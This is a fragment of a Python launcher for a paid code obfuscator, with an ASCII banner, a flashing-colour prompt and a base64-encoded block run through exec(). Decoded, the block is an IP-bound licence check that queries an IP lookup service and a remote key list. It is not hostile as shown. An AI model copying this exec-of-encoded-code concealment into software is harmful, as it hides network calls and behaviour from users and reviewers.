*/***/********////********/*****//*****,,,,,.#&&&&&&&&&&&&&&&&&&&&&&&&&& &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&( &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&##,,,,*******/***/********//*/********/*
********//********//***/****/**//*****,,,,,,..&&&&&&&&&&&&&&&&&&&&&&&&& &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&& %&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&,,,,,*************///********//***/****
*///*****/**************/***************,,,,,.&&&&&&&&&&&&&&&&&&&&&&&& &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&& (&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&*,,,,********///*****/******************
*******/****/**/****///***************,,,,,,..&&&&&&&&&&&&&&&&&&&&&&& %&&&&&&&&&&&@@@@@@&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&& (&&&&&&&&&&&&&&&&&&&&&&&&&&&&/,,,,,*******************/**/****//******
*******/**********/******************,,,,,....,&&&&&&&&&&&&&&&&&&&&&&&&&&&%@@@@@@@@@@@@@@@@@@&&&&&&&&&&&&&&&&%&@@@@@&%&&&&&&&&&&&& %&&&&&&&&&&&&&&&&&&&&&&&&&&*,,,,,***************/**********/*********
**//*********//********//***********,,*&&&#,...&&&&&&&&&&&&&&&&&&&&&&&&%@@@@@@@@@@@@@@@@@@@@@@@@&&&&&&&&%@@@@@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&,,,,,,***********/**********//***/****/****
//*********/***//****/***///********,*&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&&&&@@@@@@@@@@@@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&,,,,,***********/*********//***//***//***///
/****//****/****/******************,,,&&&&&*.(&&%&&&&&&&&&&&&&&&&&&%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%&&@@@@@@@@@@@@@@@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&&&&&&&&&&,,,,,,,******/****/****//***/*****/***********
***********************************,,,,&&&%&&& &&&&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&&&&&&&%..,,,,************************************/****
**********************************,,,,,,&&&&&&& &&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&&&&&..,,,,,,,****************************************
/***************/****************,,,,,,.*&&&&&&&%&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@@@@@@@@@@#  @@@@@@@.@@@@@@@@@#  @@@@@@@@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&&&&&&&&&,,,********//***/***************/***********
*************************/*******,,,,,,../&&&&&&*&&%&&&&&&&&&&&&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&&&&&&&&&&&&&&&&&&.&&&%,,***************************************/**
********/*************************,,,,,,..#&&&&&&#&&%&&&&&&&&&&&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&&&&&&&&&&&&&%&&.&&&&&,,**********************/********************
***********************************,,,,,,..&&&&&&.&&&&&&&&&&&&&&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&&&&&&&&&&&&&&&#&&&&&,,,,*********/********************************
****************/********************,,,,,,..&&&&&&&&&&#&&&&&&&&&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&&&&&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&&&&&&&&&&#&&/&&&&&&,,,,******************************//***********
********/****************************,,,,,,......%&&&&%. ,&&&&&&&&&&@@@@@@@@@@@@@@@@@@@@@@@@&&&&&&&&&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&&&&&&&&&&#&&&,&&&&&&,,,,,,******************************************
**********************/****************,,,,,,......        &&&&&&&&&&&@@@@@@@@@@@@@@@@@@@&&&&&&&&&&&&&&&@@@@@@@@@@@@@@@@@@@@@@@@@&&&&&&&&&&#&&&&*&&&&&&,,,,,**************************************/*****
*****/***********************///***********,,,,.....         &&&&&&&&&&&&&&@@@@@@@&&&&&&&&&&&&&&&&&&&&&&&&&@@@@@@@@@@@@@@@@@@@@&&&&&&&&&&%&&&&&&& &&&&,,,,,,******/********/****/***********************
*****************************************,,,,,,,,...          .&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&@@@@@@@@@@@@&&&&&&&&&&&&&&&&&&&&,&&&&/ ,,,,,*********************************************
**/**************/*****//********/**********,,,,,....        .,,,&&&&&&&&&&&& IDK Obfuscator / VeryVeryCool123#0686 &&&&&&&&&&&&&&&&&&%.,*&&&&&&&&#    ,,,,,**************/***//**************/*****/***
/****/*******************//*****************,,,,,,...        .,,,,.&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&#.,,,,,            ,,,,*************/***/*****/**************/****//*
*/***************************///****/********,,,,,,..        .,,,,,,.&&&&&&&&&&&&&&&&/@@@@&@@@@@@%@@@&@@&&&&&&&&&&&&&&&&&&&&&&&&&/.,,,,,,,            ,,,********************/**************************
***//***/***/*****/****************/*********,,,,,,..        .,,,,,,,,.(&&&&&&&&&&&&&&@@.@@@@@@@@@@@@@@@@@@  /&&&&&&&&&&&&&&&&&.,,,,,,,,,,            ,,,,******/***/***/*****///**/****/***************
**********/***********************************,,,,...        .,,,,,,,,,,,.&&&&&&&&&&&&&&.         .// ,@@ /&&&&&&&&&&&&&&&&&#.,,,,,,,,,,,,            ,,,,,********//***********************************
/*******/**/**///****/******************/*****,,,,...        .,,,,,,,,,,,,,,.&&&&&&&&&&&&&%             &&&&&&&&&&&&&&&&&#.,,,,,,,,,,,,,,,            ,,,,*************/****/*******/*//**//*****/******
**/**********/*******************************,,,,,,.,*****.  .,,,,,,,,,,,,,,,,,.#&&&&&&&&&&&&&//////,&&&&&&&&&&&&&&&&&..,,,,,,,,,,,,,,,,,,            ,,,****************/***/***********/**************
************////*//*****/********************,,,,,,..*****   .,,,,,,,,,,,,,,,,,,,,..%&&&&&&&&&&&&&&&&&&&&&&&&&&&&#..,,,,,,,,,,,,,,,,,,,,,,            ,,,,******//**********************///**/**********
/****/****/*********/************************,,,,,...        .,,,,,,,,,,,,,,,,,,,,,,,,,../&&&&&&&&&&&&&&&&&,...,,,,,,,,,,,,,,,,,,,,,,,,,,,            ,,,,,******//******************//********//*******
**///*//***//*******************************,,,,,...  ///    .,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,......,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,            ,,,,**********/****//***///*//***//***************
*************//********/***///***//*********,,.....********,  .,,,,,,,,,,,,,,,,,,,,,,,&&&&&%,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,            ,,,,,******************************/********//***/
************************//****************,,                   ,,,,,,,,,,,,,&&&&&&(&&&&&&&&&&&&,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,, (((((((((((((((/,**********/*****************************/***
///******************/*********//*******,,,,                   ,,,,,,,,,,,,%&&&&&&&%&&&&#&&,,*&&(,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,##################,***************///*****************//******
**********************/*****************,,,,                   .,,,,,,,,,,,,*&&/,,,,&&&%&&&,,,,/,,,,,,,,,,,,,,,,,,,,,,,,#,,,,,,,,,,,,,,,,,##################,,*****/**/**/************************/*****
*************//**************/*********,,,,,                      ,,,,,,,,,,,,,,,,,,#,,#(,,,,,,,,,,,,,,,,,,,,,,,/&&&&&&&&&&(,,,,,,,,,,,,,,##################,,,******/*****/*************/**************
***********/****/****//****************,,,,,.##################,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,&&&&&&&&&#&#,,,,,,,,,,,,,,,,##################,*******************************/****//*****
************/**************************,,,,,.(################/,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,&&&&&&&&&&&&&,,,,,,,,,,,,,,,,(################*,***********/*******************************
****/*************************/*********,,,,,..... ........   ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,&&#,,*&&&&,,,,,,,,,,,,,,,,,,,    ...........,,,,,******/******/***//***********************
/***************************************,,,,,..... ........   ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(&&,,,,,,,,,,,,,,,,,,,,,,,,,,    ..........,,,,,*,*************/*********/*****************
******//********/*******//*/****/*******,,,,,,,... ........   .,,,,,,,,,,,,,,,,,,,,,,,.,.,,........................,,,,,,,,,,,,,,,,,,,,,,     ..........,,,,,********/************//*******//*******/***
****/************/***/***********//*******,,,,,,...........    ,,,,,,,,,,,,,,,,,,,,.*,,................... ..  ...........,,,,,,,,,,,,,,,     ..........,,,,**************/*****/************/***/******
****************//*************************,,,,,...........     ........,,,,,,,,,....,..,.../,..........,#..,.#(..,. ..........,,,,,,,,.      ..........,,,**********************************/**********
*******************************//***/*******,,,,,..........             ,,,,,.....,..,...,.......,,,,,.......,,,,,.*... ...........,,,.       ..........,,,,*****/**********/***************************
**/**********/***/****/****/**************,,,,,,...........               .......#*,..,...,,.,..,,,,,,,.,.,..,,.,...,...,.  .........         ..........,,,,,*****************/*********//***/****/****/
*******/*********************/***********,,,,,.............     ,,,,,......... ...,.,,.,.,..,,,........ .,..,.......,.,. ,,.... ..........,   ..........,,,,,,*********************/********************
*****/***********//********************         .. ........    ,,,............ ...,........,,. ...........,,,....,..,. ,....................  ............        ,**************************/**********
****/**********/*****///**/***********.         .. ........    ............  ...,.....   .,..,............ ,...,..,  ...,..*#.....,,,....................          ************//**********/****///***/*
****/***/***************/**********,,,.         .. ........  ............,,,....,,,,.......,..................,.. ..,.,,....., ..,,,,,,,............... .          ********/****/***/***************/***
*********//********/**************,,,,.         .  ........ ..........,,,,,,,,.*#,,......,,.,,,,,,,,,,,,,,,,,,,,..,,,,....,#(,,,,,,,,,,,,, ............ .          ,,,***************/***/***/*/*****/**
/***************/***************,,,,,,.           ,........                     ...,.,.#,.                            .,,,..                  ......... .          ,,,******/***************/***********    
'''
    os.system('mode con cols=200 lines=230')
    if userchoicemain == 1:
        yeschoice = int(input('''
ARE YOU SURE YOU WANT TO CONTINUE? THIS BANNER HAS FLASHING COLORS.
(1) Yes, I am safe with flashing colors.
(2) No, I am not safe with flashing lights and/or colors.
>> '''))
        if yeschoice == 1:
            n = 0
            while n < 20:
                n += 1
                bannerprint(Colors.red)
                bannerprint(Colors.orange)    
                bannerprint(Colors.yellow)    
                bannerprint(Colors.green)    
                bannerprint(Colors.blue)    
                bannerprint(Colors.purple)    
                bannerprint(Colors.pink) 
        elif yeschoice == 2:
            print(Colors.white, banner)
            time.sleep(5)
        else:
            print('Invalid choice! Only choices are: 1 (yes) and 2 (no).')
            time.sleep(3)
            sys.exit()
    elif userchoicemain == 2:
        print(Colors.white, banner)
        time.sleep(5)
    else:
        print('Invalid choice! Only choices are 1 and 2.')
        time.sleep(3)
        sys.exit()
    os.system('cls')
    os.system('mode con cols=100 lines=45')
    exec((base64.b64decode('aXAgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vYXBpLmlwaWZ5Lm9yZy8nKS50ZXh0CmRlZiBjaGVjayhyZWdjaGVjaywgcHJlbWNoZWNrLCBpcGNoZWNrKToKICAgIGlmIHJlZ2NoZWNrICE9IHJlZ3VsYXJfa2V5OgogICAgICAgIHByaW50KGYne0NvbG9ycy5yZWR9SW52YWxpZCByZWd1bGFyIGtleSEgTWFrZSBzdXJlIHRvIGNvcHkgdGhlIGtleSBmcm9tIHRoZSBkaXNjb3JkIGV4YWN0bHkgYXMgaXQgaXMuJykKICAgICAgICB0aW1lLnNsZWVwKDMpCiAgICAgICAgc3lzLmV4aXQoKQogICAgZWxzZToKICAgICAgICBpZiBpcGNoZWNrICE9IGlwOgogICAgICAgICAgICBwcmludChmJ3tDb2xvcnMucmVkfUltYWdpbmUgdHJ5aW5nIHRvIGJ5cGFzcyB0aGUga2V5IHN5c3RlbSBsb2wgLSBrZXlzIGFyZSBsaXRlcmFsbHkgSVAgYmFzZWQgOnNrdWxsOicpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgc3lzLmV4aXQoKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGlmIHByZW1jaGVjayAhPSBwcmVtaXVtX2tleToKICAgICAgICAgICAgICAgIHByaW50KGYne0NvbG9ycy53aGl0ZX1JREsgT2JmdXNjYXRvciAtIFJlZ3VsYXIgV2hpdGVsaXN0IC8vIDk5UiQgLyAkMS4yMCAtPiBTdGFydGluZyEnKQogICAgICAgICAgICAgICAgcmVndWxhcigpCiAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDEwKQogICAgICAgICAgICBlbGlmIHByZW1jaGVjayA9PSBwcmVtaXVtX2tleToKICAgICAgICAgICAgICAgIHByaW50KGYne0NvbG9ycy5ncmVlbn1JREsgT2JmdXNjYXRvciAtIHtDb2xvcmF0ZS5Ib3Jpem9udGFsKENvbG9ycy5yYWluYm93LCAiUFJFTUlVTSBXaGl0ZWxpc3QgLy8gMjQ5UiQgLyAkMi45OSAtPiBTdGFydGluZyEiKX0nKQogICAgICAgICAgICAgICAgUHJlbWl1bSgpCiAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDEwKQp1cmwgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8va3kub3hmb3hmb2Z4LnJlcGwuY28vJykudGV4dAprZXlzID0ganNvbi5sb2Fkcyh1cmwpCnJlZzEgPSBrZXlzWyJyZWdrZXkxIl0KcHJlbTEgPSBrZXlzWyJwcmVta2V5MSJdCmlwMSA9IGtleXNbImlwMSJdCnJlZzIgPSBrZXlzWyJyZWdrZXkyIl0KcHJlbTIgPSBrZXlzWyJwcmVta2V5MiJdCmlwMiA9IGtleXNbImlwMiJdCnVzZXIgPSBpbnQoaW5wdXQoJ1doYXQgbnVtYmVyIHVzZXIgYXJlIHlvdT8gKEdldCBpdCBmcm9tIHRoZSBidXlpbmcgY2hhbm5lbClcbj4+ICcpKQppZiB1c2VyID09IDE6CiAgICBjaGVjayhyZWcxLHByZW0xLGlwMSkKZWxpZiB1c2VyID09IDI6CiAgICBjaGVjayhyZWcyLHByZW0yLGlwMikKZWxzZToKICAgIHByaW50KCdJbnZhbGlkIHVzZXIgLSBsb29rIGF0IHlvdXIgdGlja2V0IGZvciBtb3JlIGluZm9ybWF0aW9uJyk=')).decode('utf-8'))